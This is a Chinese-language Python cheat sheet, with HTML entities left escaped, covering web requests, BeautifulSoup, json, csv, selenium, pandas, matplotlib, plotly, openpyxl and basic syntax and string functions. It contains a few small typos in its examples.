print(response.encoding) \u0026gt;\u0026gt;\u0026gt; \u0026#39;ISO-8859-1\u0026#39; # 轉編碼為utf-8 response.encoding = \u0026#34;utf-8\u0026#34; html內容 - text 1 2 3 print(response.text) \u0026gt;\u0026gt;\u0026gt; \u0026#39;\u0026lt;!DOCTYPE html\u0026gt;\\r\\n\u0026lt;!--STATUS OK--\u0026gt;\u0026lt;html\u0026gt;...\u0026#39; response headers - headers 1 2 3 print(response.headers) \u0026gt;\u0026gt;\u0026gt; {\u0026#39;Server\u0026#39;: \u0026#39;Baby Web Server\u0026#39;, \u0026#39;Content-Type\u0026#39;: \u0026#39;text/html\u0026#39;, \u0026#39;Content-Length\u0026#39;: \u0026#39;467\u0026#39;, \u0026#39;Set-Cookie\u0026#39;: \u0026#39;SESSIONID=00000006; path=/;version=1\u0026#39;, \u0026#39;Date\u0026#39;: \u0026#39;Sun, 03 May 2020 10:41:58 GMT\u0026#39;} request headers - request.headers 其中的User-Agent相當重要，用來判斷使用者的相關資訊用，爬蟲與反爬蟲通常使用此參數。 1 2 3 print(response.request.headers) \u0026gt;\u0026gt;\u0026gt; {\u0026#39;User-Agent\u0026#39;: \u0026#39;python-requests/2.22.0\u0026#39;, \u0026#39;Accept-Encoding\u0026#39;: \u0026#39;gzip, deflate\u0026#39;, \u0026#39;Accept\u0026#39;: \u0026#39;*/*\u0026#39;, \u0026#39;Connection\u0026#39;: \u0026#39;keep-alive\u0026#39;} 抓圖片檔 開檔格式使用wb:二進位格式寫入 w:寫入 / b:二進位格式 1 2 3 4 5 6 7 8 import requests res = requests.get(\u0026#34;https://www.natgeomedia.com/userfiles/PhotoContest/771/sm1100/2019091450912553.jpg\u0026#34;) photo = res.content # w:寫入/b:二進位格式 \u0026#34;wb\u0026#34; =\u0026gt; 二進位格式寫入 with open(\u0026#34;img01.jpg\u0026#34;, \u0026#34;wb\u0026#34;) as file: file.write(photo) 帶request header的請求 先從一般瀏覽器取得header(user-agent) 需使用關鍵字參數 1 2 3 4 5 # 從瀏覽器的開發者工具取得正常的request headers資料 headers = {\u0026#34;user-agent\u0026#34;: \u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36\u0026#34;} # 在後方帶入關鍵字參數headers res = requests.get(\u0026#34;http://google.com.tw\u0026#34;, headers = headers) POST POST 可帶的參數(需使用關鍵字參數) 說明 data form data請求的data headers 請求的headers cookies client的cookies POST存Session - .Session() 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 data = { \u0026#34;from\u0026#34;: \u0026#34;/bbs/Gossiping/index.html\u0026#34;, \u0026#34;yes\u0026#34;: \u0026#34;yes\u0026#34; } headers = { \u0026#34;user-agent\u0026#34;: \u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36\u0026#34; } # 先使用POST取得滿18歲的驗證並存放置session內 rs = requests.Session() rs.post(\u0026#34;https://www.ptt.cc/ask/over18\u0026#34;, data = data, headers = headers) # 過滿18歲的驗證後使用get取得網頁內容 response = rs.get(\u0026#34;https://www.ptt.cc/bbs/Gossiping/index.html\u0026#34;, headers = headers) 解析\u0026amp;美化HTML模組 - BeautifulSoup4 載入模組 1 from bs4 import BeautifulSoup BeautifulSoup4的基本元素表 基本元素 說明 tag 標籤：最基本的信息組織單位，分別用\u0026lt;\u0026gt;和\u0026lt;/\u0026gt;標明開頭與結尾。 name 標籤名稱：\u0026lt;p\u0026gt;...\u0026lt;/p\u0026gt;的名字是p，格式：\u0026lt;tag\u0026gt;.name。 Attributes 屬性：\u0026lt;tag\u0026gt;.attrs，dict型式。 NavigatString 內容：\u0026lt;tag\u0026gt;.string。 Comment 註釋：標籤內字符串的註釋部分，一種特殊的Comment類型。 解析 - .BeautifulSoup(html, \u0026lsquo;html.parser\u0026rsquo;) 1 2 3 4 5 6 7 8 9 10 demo = \u0026#34;\u0026#34;\u0026#34; \u0026lt;html\u0026gt;\u0026lt;head\u0026gt;\u0026lt;title\u0026gt;This is a python demo page\u0026lt;/title\u0026gt;\u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p class=\u0026#34;title\u0026#34;\u0026gt;\u0026lt;b\u0026gt;The demo python introduces several python courses.\u0026lt;/b\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;p class=\u0026#34;course\u0026#34;\u0026gt;Python is a wonderful general-purpose programming language. You can learn Python from novice to professional by tracking the following courses: \u0026lt;a href=\u0026#34;http://www.icourse163.org/course/BIT-268001\u0026#34; class=\u0026#34;py1\u0026#34; id=\u0026#34;link1\u0026#34;\u0026gt;Basic Python\u0026lt;/a\u0026gt; and \u0026lt;a href=\u0026#34;http://www.icourse163.org/course/BIT-1001870001\u0026#34; class=\u0026#34;py2\u0026#34; id=\u0026#34;link2\u0026#34;\u0026gt;Advanced Python\u0026lt;/a\u0026gt;.\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt; \u0026#34;\u0026#34;\u0026#34; soup = BeautifulSoup(demo, \u0026#39;html.parser\u0026#39;) 美化 - .prettify() 1 print(soup.prettify()) 取得屬性 - .attrs 1 2 3 4 5 print(soup.a.attrs) \u0026gt;\u0026gt;\u0026gt; {\u0026#39;href\u0026#39;: \u0026#39;http://www.icourse163.org/course/BIT-268001\u0026#39;, \u0026#39;class\u0026#39;: [\u0026#39;py1\u0026#39;], \u0026#39;id\u0026#39;: \u0026#39;link1\u0026#39;} 取得tag內容 - .string/.text 1 2 3 4 5 print(soup.a.string) print(soup.a.text) \u0026gt;\u0026gt;\u0026gt; \u0026#39;Basic Python\u0026#39; \u0026gt;\u0026gt;\u0026gt; \u0026#39;Basic Python\u0026#39; 找第一個標籤 - .find(\u0026quot;標籤\u0026quot;) 1 2 3 soup.find(\u0026#34;a\u0026#34;) \u0026gt;\u0026gt;\u0026gt; \u0026lt;a class=\u0026#34;py1\u0026#34; href=\u0026#34;http://www.icourse163.org/course/BIT-268001\u0026#34; id=\u0026#34;link1\u0026#34;\u0026gt;Basic Python\u0026lt;/a\u0026gt; 找全部的標籤 - .find_all(\u0026quot;標籤\u0026quot;, class_=\u0026quot;className\u0026quot;) 可加上class做篩選條件。 1 2 3 4 5 6 7 8 9 # 寫法1： soup.find_all(\u0026#34;p\u0026#34;, class_=\u0026#34;title\u0026#34;) \u0026gt;\u0026gt;\u0026gt; [\u0026lt;p class=\u0026#34;title\u0026#34;\u0026gt;\u0026lt;b\u0026gt;The demo python introduces several python courses.\u0026lt;/b\u0026gt;\u0026lt;/p\u0026gt;] # 寫法2： soup.find_all(\u0026#34;p\u0026#34;, {\u0026#34;class\u0026#34;=\u0026#34;title\u0026#34;}) \u0026gt;\u0026gt;\u0026gt; [\u0026lt;p class=\u0026#34;title\u0026#34;\u0026gt;\u0026lt;b\u0026gt;The demo python introduces several python courses.\u0026lt;/b\u0026gt;\u0026lt;/p\u0026gt;] 透過選擇器篩選標籤 - .select(同CSS選擇器,Class或ID) 若有空格會有問題，soup.select(.\u0026quot;title p\u0026quot;) 會報錯，空格需使用.find()、.findAll() 1 2 3 4 5 6 7 # 使用Class選擇器 print(soup.select(\u0026#34;.title\u0026#34;)) \u0026gt;\u0026gt;\u0026gt; [\u0026lt;p class=\u0026#34;title\u0026#34;\u0026gt;\u0026lt;b\u0026gt;The demo python introduces several python courses.\u0026lt;/b\u0026gt;\u0026lt;/p\u0026gt;] # 使用ID選擇器 print(soup.select(\u0026#34;#link1\u0026#34;)) \u0026gt;\u0026gt;\u0026gt; [\u0026lt;a class=\u0026#34;py1\u0026#34; href=\u0026#34;http://www.icourse163.org/course/BIT-268001\u0026#34; id=\u0026#34;link1\u0026#34;\u0026gt;Basic Python\u0026lt;/a\u0026gt;] json模組 載入模組 1 import json json轉dict - json.loads(\u0026quot;字串\u0026quot;) 1 2 3 4 5 6 7 import json txt = \u0026#39;{ \u0026#34;name\u0026#34;: \u0026#34;John\u0026#34;, \u0026#34;age\u0026#34;: \u0026#34;28\u0026#34;, \u0026#34;city\u0026#34;: \u0026#34;Taiwan\u0026#34; }\u0026#39; data = json.loads(txt) print(type(data)) # 字典型態 \u0026gt;\u0026gt;\u0026gt; \u0026#39;\u0026lt;class \u0026#39;dict\u0026#39;\u0026gt;\u0026#39; dict轉json string - json.dumps(\u0026quot;字典\u0026quot;) 1 2 3 4 5 6 7 import json txt = { \u0026#34;name\u0026#34;: \u0026#34;John\u0026#34;, \u0026#34;age\u0026#34;: \u0026#34;28\u0026#34;, \u0026#34;city\u0026#34;: \u0026#34;Taiwan\u0026#34; } jsonData = json.dumps(txt) print(jsonData) # 轉換後為json格式的字串 \u0026gt;\u0026gt;\u0026gt; {\u0026#34;name\u0026#34;: \u0026#34;John\u0026#34;, \u0026#34;age\u0026#34;: \u0026#34;28\u0026#34;, \u0026#34;city\u0026#34;: \u0026#34;Taiwan\u0026#34;} csv模組 載入模組 1 import csv 以_csv.reader型態讀取csv檔 - csv.reader(檔案) 1 2 3 4 5 6 import csv with open(\u0026#39;MI_5MINS_HIST.csv\u0026#39;, encoding=\u0026#39;big5\u0026#39;) as file: rows = csv.reader(file) # 一筆一筆取出資料 for row in rows: print(row) 以dict型態讀取csv檔 - csv.DictReader(檔案) 1 2 3 4 5 6 import csv with open(\u0026#39;MI_5MINS_HIST.csv\u0026#39;, encoding=\u0026#39;big5\u0026#39;) as file: rows = csv.DictReader(file) # 一筆一筆取出資料 for row in rows: print(row) 寫入csv檔 - csv.writer(檔案變數) 需先定義一個物件為csv.writer()，在進行寫入。 writerow() ：單行寫入 1 2 3 4 5 6 with open(\u0026#39;Temp.csv\u0026#39;, \u0026#39;w\u0026#39;) as csvfile: writer = csv.writer(csvfile) writer.writerow([\u0026#39;姓名\u0026#39;, \u0026#39;身高\u0026#39;, \u0026#39;體重\u0026#39;]) writer.writerow([\u0026#39;Jessica\u0026#39;, 158, 45]) writer.writerow([\u0026#39;Wayne\u0026#39;, 172, 60]) 以字典型態寫入csv檔 - csv.DictWriter(檔案變數, fieldnames=欄位變數(列表型態)) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 with open(\u0026#39;DictTemp.csv\u0026#39;, \u0026#39;w\u0026#39;, encoding=\u0026#39;big5\u0026#39;) as csvfile: # 設定欄位變數 rowNames = [\u0026#39;姓名\u0026#39;, \u0026#39;身高\u0026#39;, \u0026#39;體重\u0026#39;] # fieldnames = 指定欄位 writer = csv.DictWriter(csvfile, fieldnames=rowNames) # 寫入欄位名稱 writer.writeheader() #寫入資料 writer.writerow({\u0026#39;姓名\u0026#39;: \u0026#39;Jessica\u0026#39;, \u0026#39;身高\u0026#39;: 156, \u0026#39;體重\u0026#39;: 45}) writer.writerow({\u0026#39;姓名\u0026#39;: \u0026#39;Wayne\u0026#39;, \u0026#39;身高\u0026#39;: 172, \u0026#39;體重\u0026#39;: 60}) 模擬瀏覽器模組(自動化測試) - selenium 安裝 selenium 模組 Anaconda編譯器的話，使用Anaconda Prompt 1 2 ### anaconda 安裝 selenium 模組 conda install selenium 1 2 ### 使用 pip 安裝 selenium 模組 pip install selenium 下載瀏覽器驅動(web driver)\n先查看chrome瀏覽器的版本，Google：Web driver chrome後下載。\n載入模組\n1 from selenium import webdriver 實例化一個瀏覽器視窗(Chrome)，並設定一個瀏覽器物件 檔案名稱勿與selenium模組名稱相同以免衝突而無法執行 1 2 3 from selenium import webdriver driver = webdriver.Chrome() 發送GET請求 - 瀏覽器物件.get(網址) 1 driver.get(\u0026#34;http://www.baidu.com\u0026#34;) 根據dom元件的id/class定位 - 瀏覽器物件.find_element_by_id(id) 或 瀏覽器物件.find_element_by_class(class) 1 2 # 找到id為\u0026#34;kw\u0026#34;的input，並輸入\u0026#34;python\u0026#34; driver.find_element_by_id(\u0026#34;kw\u0026#34;).send_keys(\u0026#34;python\u0026#34;) 送出表單 - 瀏覽器物件.dom元件.submit() 1 2 # 送出id為\u0026#34;su\u0026#34;的表單 driver.find_element_by_id(\u0026#34;su\u0026#34;).submit() 點擊事件 - 瀏覽器物件.dom元件.click() 1 2 # 送出id為\u0026#34;btn\u0026#34;的按鈕 driver.find_element_by_id(\u0026#34;btn\u0026#34;).click() 取得頁面原始碼 - .page_source 1 SourceHtml = driver.page_source 螢幕截圖 - 瀏覽器物件.save_screenshot(截圖的圖檔名稱) 1 driver.save_screenshot(\u0026#34;screen.png\u0026#34;) 獲取cookies - 瀏覽器物件.get_cookie() 1 2 cookies = driver.get_cookie() print(cookies) 關閉實例化的瀏覽器視窗 - 瀏覽器物件.close() 或 瀏覽器物件.quit() 1 2 driver.close() # 或 driver.quit() 資料分析模組 - Pandas 載入模組 1 import pandas 解析list類型 - pandas物件.Series(資料) 1 2 3 4 5 6 7 8 9 import pandas data = [20, 10, 15] pds = pandas.Series(data) print(pds) \u0026gt;\u0026gt;\u0026gt; 0 20 \u0026gt;\u0026gt;\u0026gt; 1 10 \u0026gt;\u0026gt;\u0026gt; 2 15 \u0026gt;\u0026gt;\u0026gt; dtype: int64 解析Data類型 - pandas物件.DataFrame(字典型態的資料) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 data = pandas.DataFrame({ \u0026#34;name\u0026#34;: [\u0026#34;Amy\u0026#34;, \u0026#34;Jack\u0026#34;, \u0026#34;Cathy\u0026#34;], \u0026#34;salary\u0026#34;: [1000, 5000, 2000] }) print(data) \u0026gt;\u0026gt;\u0026gt; name salary \u0026gt;\u0026gt;\u0026gt; 0 Amy 1000 \u0026gt;\u0026gt;\u0026gt; 1 Jack 5000 \u0026gt;\u0026gt;\u0026gt; 2 Cathy 2000 # 取特定欄位 print(data[salary]) \u0026gt;\u0026gt;\u0026gt; 0 1000 \u0026gt;\u0026gt;\u0026gt; 1 5000 \u0026gt;\u0026gt;\u0026gt; 2 2000 可指定x軸或y軸欄位名稱(columns, index) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 import pandas data = [ [65,92,78,83,70], [62,96,81,63,71], [45,58,30,53,75], [90,91,70,90,100], ] index = [\u0026#34;張三\u0026#34;, \u0026#34;李四\u0026#34;, \u0026#34;王五\u0026#34;, \u0026#34;趙雲\u0026#34;] columns = [\u0026#34;國文\u0026#34;, \u0026#34;數學\u0026#34;, \u0026#34;英文\u0026#34;, \u0026#34;自然\u0026#34;, \u0026#34;社會\u0026#34;] df = pandas.DataFrame(data, columns = columns, index = index) print(df) \u0026gt;\u0026gt;\u0026gt; 國文 數學 英文 自然 社會 \u0026gt;\u0026gt;\u0026gt; 張三 65 92 78 83 70 \u0026gt;\u0026gt;\u0026gt; 李四 62 96 81 63 71 \u0026gt;\u0026gt;\u0026gt; 王五 45 58 30 53 75 \u0026gt;\u0026gt;\u0026gt; 趙雲 90 91 70 90 100 回傳最大值 - Data資料.max() 1 2 3 4 5 data = [20, 10, 15] pds = pandas.Series(data) print(pds.max()) \u0026gt;\u0026gt;\u0026gt; 20 回傳最小值 - 資料.min() 1 2 3 4 5 data = [20, 10, 15] pds = pandas.Series(data) print(pds.min()) \u0026gt;\u0026gt;\u0026gt; 10 取得指定欄位 - Data資料.loc[x][y] 1 2 3 4 5 6 7 8 9 10 11 12 13 data = pandas.DataFrame({ \u0026#34;name\u0026#34;: [\u0026#34;Amy\u0026#34;, \u0026#34;Jack\u0026#34;, \u0026#34;Cathy\u0026#34;], \u0026#34;salary\u0026#34;: [1000, 5000, 2000] }) print(data) print(data.loc[0][1]) \u0026gt;\u0026gt;\u0026gt; name salary \u0026gt;\u0026gt;\u0026gt; 0 Amy 1000 \u0026gt;\u0026gt;\u0026gt; 1 Jack 5000 \u0026gt;\u0026gt;\u0026gt; 2 Cathy 2000 \u0026gt;\u0026gt;\u0026gt; 1000 輸出成csv(或json)檔案 - Data資料.to_csv(\u0026quot;檔名\u0026quot;, encoding=\u0026quot;編碼\u0026quot;) 或 Data資料.to_json(\u0026quot;檔名\u0026quot;, encoding=\u0026quot;編碼\u0026quot;) 1 2 3 4 5 6 7 8 9 10 11 import pandas data = [ [65,92,78,83,70], [62,96,81,63,71], [45,58,30,53,75], [90,91,70,90,100] ] index = [\u0026#34;張三\u0026#34;, \u0026#34;李四\u0026#34;, \u0026#34;王五\u0026#34;, \u0026#34;趙雲\u0026#34;] columns = [\u0026#34;國文\u0026#34;, \u0026#34;數學\u0026#34;, \u0026#34;英文\u0026#34;, \u0026#34;自然\u0026#34;, \u0026#34;社會\u0026#34;] df = pandas.DataFrame(data, columns = columns, index = index) df.to_csv(\u0026#39;temp.csv\u0026#39;, encoding=\u0026#34;utf-8-sig\u0026#34;) 繪圖模組 - plot 載入模組 1 import matplotlib.pyplot as plt 畫折線圖 - .plot(X軸資料, Y軸資料) 1 2 3 4 5 6 7 import matplotlib.pyplot as plt x1 = [1,4,7,9,13,16] y1 = [15,50,80,40,70,50] # 畫出折線圖 plt.plot(x1, y1) 顯示Label - .legend() 要顯示label需執行此function :為點線, --為虛線, 不指定預設為實線 1 2 3 4 5 6 7 8 9 10 import matplotlib.pyplot as plt x1 = [1,4,7,9,13,16] y1 = [15,50,80,40,70,50] # :為點線, --為虛線, 不指定預設為實線 plt.plot(x1, y1, label=\u0026#34;food\u0026#34;, color=\u0026#34;red\u0026#34;, linestyle=\u0026#34;:\u0026#34;) #要顯示label - 需執行legend() plt.legend() 指定圖表標題 - .title() 1 plt.title(\u0026#34;學生成績\u0026#34;) 指定X/Y軸標題 - .xlabel(X軸標題) / .ylabel(Y軸標題) 1 2 plt.xlabel(\u0026#34;X軸標題\u0026#34;) plt.ylabel(\u0026#34;Y軸標題\u0026#34;) 畫長條圖 - .bar(X軸資料, Y軸資料) 1 2 3 4 5 6 7 import matplotlib.pyplot as plt x1 = [1,4,7,9,13,16] y1 = [15,50,80,40,70,50] # 畫出長條圖 plt.bar(x1, y1) 畫圓餅圖 - .pie(資料) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 import matplotlib.pyplot as plt datas = [5,10,20,15] # 畫出圓餅圖 plt.pie(datas) # 讓特定區塊凸出(需與資料數量相同) explode = [0,0,0.05,0] plt.pie(datas, explode = explode) # 指定每個區塊的標題 labels = [\u0026#34;東部\u0026#34;,\u0026#34;南部\u0026#34;,\u0026#34;西部\u0026#34;,\u0026#34;北部\u0026#34;] plt.pie(sizes, labels = labels) # 顯示百分比 plt.pie(sizes,autopct=\u0026#34;%3.1f%%\u0026#34;) 繪圖模組2 - plotly 安裝 plotly 模組 Anaconda編譯器的話，需使用Anaconda Prompt安裝。 使用Jupyter Notebook編輯 1 2 ### anaconda 安裝 plotly 模組 conda install plotly 載入模組(並指定繪圖模式) 1 2 3 4 import plotly # 指定繪圖模式：Scatter, Bar, Pie, Box, Scattergeo, Histogram from plotly.graph_objs import Scatter # 折線散點圖 在線繪圖需收費，需使用離線繪圖 1 plotly.offline.init_notebook_mode(connected=True) 指定X/Y軸資料 1 data = [Scatter(x=[\u0026#34;林大名\u0026#34;, \u0026#34;陳聰明\u0026#34;, \u0026#34;黃美麗\u0026#34;], y=[67,89,72])] 畫出折線圖 1 2 data = [Scatter(x=[\u0026#34;林大名\u0026#34;, \u0026#34;陳聰明\u0026#34;, \u0026#34;黃美麗\u0026#34;], y=[67,89,72])] plotly.offline.iplot({\u0026#34;data\u0026#34;:data}) 指定繪圖的mode 1 2 3 # markers：只有點 / lines：只有線 / lines + markers：點 + 線 data = [Scatter(x=[\u0026#34;林大名\u0026#34;, \u0026#34;陳聰明\u0026#34;, \u0026#34;黃美麗\u0026#34;], y=[67,89,72], mode=\u0026#34;markers\u0026#34;)] plotly.offline.iplot({\u0026#34;data\u0026#34;:data}) 指定圖表標題(繪圖模式須import Layout) 1 2 3 4 5 6 7 8 9 10 11 12 import plotly from plotly.graph_objs import Scatter, Layout # 離線繪圖模式 plotly.offline.init_notebook_mode(connected=True) data = [Scatter(x=[\u0026#34;林大名\u0026#34;, \u0026#34;陳聰明\u0026#34;, \u0026#34;黃美麗\u0026#34;], y=[67,89,72])] # 指定圖表標題 plotly.offline.iplot({\u0026#34;data\u0026#34;:data, \u0026#34;layout\u0026#34;:Layout(title=\u0026#34;成績單\u0026#34;)}) Excel模組 - openpyxl 載入模組 1 import openpyxl 建立工作簿物件 - openpyxl.Workbook() 1 2 # 工作簿物件 workbook = openpyxl.Workbook() 取得指定工作表 1 2 # 工作表物件 sheet = workbook.worksheets[0] 鍵入值 方法一：行列插入 1 2 3 # sheet：工作表物件 sheet[\u0026#39;A1\u0026#39;] = \u0026#34;欄位一\u0026#34; sheet[\u0026#39;B1\u0026#39;] = \u0026#34;欄位二\u0026#34; 方法二：自動換行插入 1 2 3 # sheet：工作表物件 listTitle = [\u0026#34;姓名\u0026#34;, \u0026#34;電話\u0026#34;] sheet.append(listTitle) 取得特定欄位的值 - .value 1 sheet[\u0026#39;A1\u0026#39;].value 存檔 - 工作簿物件.save(檔名) 1 workbook.save(\u0026#39;test.xlsx\u0026#39;) 取檔 - openpyxl.load_workbook(檔名) 1 workbook = openpyxl.load_workbook(\u0026#39;test.xlsx\u0026#39;) 取得總行數 - 工作表物件.max_row 1 print(sheet.max_row) 取得總列數 - 工作表物件.max_column 1 print(sheet.max_column) 到指定欄位 - 工作表物件.cell(row=指定行數, column=指定列數) 1 2 # 印出第3行第2列的值 print(sheet.cell(row=3, column=2).value) Python 資料型態 資料型態說明 資料型態 說明 str 字串 int 整數 bool 布林值 float 浮點數 None 空值 list [] 列表，同Array tuple () 不可變更的Array dict {} 字典，同Object set () 集合，同Object，但key為索引值 Python 運算子 基本運算子 運算子 說明 + 加：數值相加,字串相連接 - 減 * 乘：數值相乘,字串可乘數值(python獨有) / 浮點數除 ** 平方 **0.5 開根號 // 整數除 % 取餘數 指派運算子 運算子 說明 += 原值等於原值加 -= 原值等於原值減 *= 原值等於原值乘 /= 原值等於原值除 判斷運算子 運算子 說明 \u0026gt; 大於 \u0026lt; 小於 == 等於 != 不等於 \u0026gt;= 大於等於 \u0026lt;= 小於等於 邏輯運算子 運算子 說明 and 並且 or 或者 not 反向 Python 函式 回傳資料型態 - type() 1 2 3 4 5 6 7 8 type(3) \u0026gt;\u0026gt;\u0026gt; \u0026lt;class \u0026#39;int\u0026#39;\u0026gt; type(\u0026#39;a\u0026#39;) \u0026gt;\u0026gt;\u0026gt; \u0026lt;class \u0026#39;str\u0026#39;\u0026gt; type(True) \u0026gt;\u0026gt;\u0026gt; \u0026lt;class \u0026#39;bool\u0026#39;\u0026gt; type(None) # Python的空值為None \u0026gt;\u0026gt;\u0026gt; \u0026lt;class \u0026#39;NoneType\u0026#39;\u0026gt; 輸入窗 - input() 1 2 3 4 myName = input(\u0026#34;請輸入姓名：\u0026#34;) \u0026gt;\u0026gt;\u0026gt; 請輸入姓名：jessica # 輸入名字後 print(myName) # 取輸入的名字 \u0026gt;\u0026gt;\u0026gt; jessica 字串轉數值 - eval() 1 2 3 num = eval(\u0026#34;3\u0026#34;) print(type(num)) \u0026gt;\u0026gt;\u0026gt; \u0026lt;class \u0026#39;int\u0026#39;\u0026gt; 特殊符號轉十進位編號 - ord() / chr() 1 2 3 4 5 6 7 # ord 將特殊符號轉換成十進位編號 ord(\u0026#39;⤅\u0026#39;) \u0026gt;\u0026gt;\u0026gt; 10501 # chr 將十進位編號轉換成特殊符號 chr(10501) \u0026gt;\u0026gt;\u0026gt; ⤅ 取最大 / 最小值 - max() / min() 1 2 3 4 min(1, 2, 45, 100) \u0026gt;\u0026gt;\u0026gt; 1 max(1, 2, 45, 100) \u0026gt;\u0026gt;\u0026gt; 100 取絕對數值 - abs() 1 2 abs(-3.14) \u0026gt;\u0026gt;\u0026gt; 3.14 進制字串轉數字 - eval() 1 2 eval(\u0026#34;0o101\u0026#34;) \u0026gt;\u0026gt;\u0026gt; 65 數字轉字串 - str() 1 2 str(324) \u0026gt;\u0026gt;\u0026gt; \u0026#39;324\u0026#39; 字串轉數字或數字轉整數 - int() 1 2 3 4 int(\u0026#34;324\u0026#34;) \u0026gt;\u0026gt;\u0026gt; 324 int(3.14) \u0026gt;\u0026gt;\u0026gt; 3 浮點數字串轉數字 - float() 1 2 float(\u0026#34;3.1416\u0026#34;) \u0026gt;\u0026gt;\u0026gt; 3.1416 四捨五入 - round(數值 [,位數]) 1 2 3 4 5 6 round(3.1416) \u0026gt;\u0026gt;\u0026gt; 3 # 第二個參數可帶位數 round(3.1416, 3) \u0026gt;\u0026gt;\u0026gt; 3.142 平方 - pow(數值, 平方根) 1 2 3 # 第二個參數為平方根 pow(5, 2) \u0026gt;\u0026gt;\u0026gt; 25 取得長度 - len() 任何資料型態都通用 1 2 3 4 5 6 7 8 9 10 11 12 13 14 # String strA = \u0026#34;Hello World\u0026#34; len(strA) \u0026gt;\u0026gt;\u0026gt; 11 # Array arrA = [1, 2, 20, 50, 100] len(arrA) \u0026gt;\u0026gt;\u0026gt; 5 # Object objA = {\u0026#34;itemA\u0026#34;:\u0026#34;123\u0026#34;, \u0026#34;itemB\u0026#34;:\u0026#34;456\u0026#34;} len(objA) \u0026gt;\u0026gt;\u0026gt; 2 編碼 / 解碼 - encode() / decode() 1 2 3 4 5 \u0026#34;中\u0026#34;.encode(\u0026#34;utf-8\u0026#34;) \u0026gt;\u0026gt;\u0026gt; b\u0026#39;\\xe4\\xb8\\xad\u0026#39; b\u0026#39;\\xe4\\xb8\\xad\u0026#39;.decode(\u0026#34;utf-8\u0026#34;) \u0026gt;\u0026gt;\u0026gt; \u0026#34;中\u0026#34; 字串轉大小寫 - upper() / lower() 1 2 3 4 5 6 7 StrA = \u0026#34;Hello World!\u0026#34; # 大寫 StrA.upper() \u0026gt;\u0026gt;\u0026gt; \u0026#39;HELLO WORLD!\u0026#39; # 小寫 StrA.lower() \u0026gt;\u0026gt;\u0026gt; \u0026#39;hello world!\u0026#39; 字串取代 - replace(舊字串, 新字串) 1 2 3 StrA = \u0026#34;Hello World!\u0026#34; StrA.replace(\u0026#34;World\u0026#34;, \u0026#34;Jessica\u0026#34;) \u0026gt;\u0026gt;\u0026gt; \u0026#39;Hello Jessica!\u0026#39; 字串判斷的函式 函式 說明 StrA.isalpha() 是否為字母 StrA.isdigit() 是否為數字 StrA.isupper() 是否為大寫 StrA.islower() 是否為小寫 StrA.isidentifer() 是否為識別字 StrA.iskeyword() 是否為關鍵字,需要keyword模組 StrA.isspace() 是否為空白 StrA.istitle() 是否為標題字(第一個字為大寫則是標題字) 字串搜尋的函式 函式 說明 Str.count(文字A) 搜尋文字A出現的次數 StrA.startswith(文字A) 是否為文字A開頭 StrA.endswith(文字A) 是否為文字A結尾 StrA.find(文字A) 搜尋文字A的位置 StrA.rfind(文字A) 搜尋文字A最後出現的位置 印出字串 - print() 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 # 一般的print(間隔預設自動補空格) print(1, 2, 3) \u0026gt;\u0026gt;\u0026gt; 1 2 3 # 間隔不空格 print(1, 2, 3, sep=\u0026#34;\u0026#34;) \u0026gt;\u0026gt;\u0026gt; 123 # 指定間隔文字 print(1, 2, 3, sep=\u0026#34;@\u0026#34;) \u0026gt;\u0026gt;\u0026gt; 1@2@3 # 指定結尾文字 print(1, 2, 3, sep=\u0026#34;@\u0026#34;, end=\u0026#34;!!!\u0026#34;) \u0026gt;\u0026gt;\u0026gt; 1@2@3!!! # 格數化輸出字元(開頭帶一個小寫的\u0026#34;f\u0026#34;) print(f\u0026#39;{變數A}*{變數B}={變數A*變數B}\u0026#39;) \u0026gt;\u0026gt;\u0026gt; A * B = AB 字串格式化 - format() 取代字串中{} 1 2 3 text = \u0026#39;world\u0026#39; print(\u0026#39;hello {}\u0026#39;.format(text)) \u0026gt;\u0026gt;\u0026gt; hello world 可帶關鍵字取代 1 2 3 4 5 name = \u0026#39;Jack\u0026#39; text = \u0026#39;world\u0026#39; print(\u0026#39;hello {name}, hello {text}\u0026#39;.format(name=name, text=text)) \u0026gt;\u0026gt;\u0026gt; hello Jack, hello world 從最後面插入 - append() 1 2 3 4 list1 = [2,4,6,8] list1.append(10) \u0026gt;\u0026gt;\u0026gt; [2,4,6,8,10] 從指定位置插入 - insert(位置, 值) 1 2 3 4 list1 = [2,4,6,8,10] list1.insert(0, -1) \u0026gt;\u0026gt;\u0026gt; [-1,2,4,6,8,10] 條件判斷 條件判斷式 - if\u0026hellip; elif\u0026hellip; else\u0026hellip; 1 2 3 4 5 6 7 # 使用縮排撰寫要做的事 if 條件A: ... elif 條件B: ... else: ... 例外判斷 - try\u0026hellip; except\u0026hellip; 1 2 3 4 5 6 7 8 try: # ... except Exception: print(\u0026#34;有異常錯誤\u0026#34;) except NameError: print(\u0026#34;變數有錯誤\u0026#34;) except TypeError: print(\u0026#34;資料格式錯誤\u0026#34;) except 錯誤分類 錯誤異常判斷 說明 Exception 只要有錯誤 NameError 變數名稱錯誤 ValueError value值錯誤 ZeroDivisionError 除數/分母不可為零的錯誤 TypeError 資料格式錯誤 迴圈 技術式迴圈 - for 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 # 跑range for i in range(1, 6): print(i, end=\u0026#34; \u0026#34;) \u0026gt;\u0026gt;\u0026gt; 1 2 3 4 5 # 跑在字串 for c in \u0026#34;Mary\u0026#34;: print(c, end=\u0026#34; \u0026#34;) \u0026gt;\u0026gt;\u0026gt; \u0026#34;M\u0026#34; \u0026#34;a\u0026#34; \u0026#34;r\u0026#34; \u0026#34;y\u0026#34; # 跑在陣列 for e in [\u0026#34;a\u0026#34;, 3, \u0026#34;Jessica\u0026#34;] \u0026gt;\u0026gt;\u0026gt; \u0026#34;a\u0026#34; \u0026gt;\u0026gt;\u0026gt; 3 